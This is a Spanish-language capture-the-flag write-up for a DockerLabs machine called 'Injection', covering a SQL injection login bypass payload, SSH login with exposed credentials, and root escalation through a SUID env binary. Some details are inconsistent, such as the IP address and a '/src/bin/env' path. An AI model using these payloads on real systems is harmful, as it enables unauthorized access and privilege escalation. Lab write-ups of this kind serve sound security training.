# Información de la Máqina
    ## Nombre: Injection
    ## Tipo: DockerLabs
    ## IP: 127.17.0.2
    ## Objetivo: Escalada de Privilegios a root

# 1.- Enumeración Inicial
Al acceder al servicio web en el puerto 80, se encuentra un formulario de login.
### Dominio Web:
![Dominio_Web](Injection_Dominio_Web.png)
### Pagina Web:
![Pagina_Web](Injection_Dominio_Web_Pagina.png)

# 2.- Explotación
Se prueba una Injección SQL clásica en el campo username:
```vbnet
' or 1=1-- -
```
![Injeccion_SQL](Injection_Dominio_Web_Injeccion_SQL.png)
Con cualquier contraseña, el login se bypassa con éxito.
El sistema muestra un nombre de usuario Dylan y una contraseña asociada.
![Datos_Sensibles](Injection_Dominio_Web_Muestra_Contrasena.png)

### Evidencia: Contraseña Guardada en:
```bash
Puntos_de_Encuentro/Password_Dylan.txt
```

# 3.- Movimiento lateral
Con las credenciales obtenidas, se establece conexión SSH:
```nginx
ssh dylan@172.17.0.2
```
![SSH](Injection_SSH_Completado.png)
Acceso exitoso como el usuario dylan

# 4.- Escalada de Privilegios
Se enumeran los binarios con bit SUID:
```javascript
find / -perm -4000 2>/dev/null
```
![Numeracion_Binarios](Injection_Escalado_Privilegios_2.png)
Se detecta /usr/bin/env con privilegios elevados.
### Ejecución del binario para escalar:
```bash
/src/bin/env /bin/sh -p
```
![Acceso_Root](Injection_Escalado_Privilegios_3_Final.png)
### Evidencia guardada en:
```bash
Puntos_de_Encuentro/Esclado_Privilegios.txt
```

# 5.- Resultado Final
Acceso root conseguido:
```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

# Conclusiones
> La máquina es vulnerable a un SQL Injection que permite burlar la autenticación.
> Las credenciales expuestas facilitan acceso vía SSH.
> La presencia de un binario SUID (env) mal configurado permite la escalada directa a root.
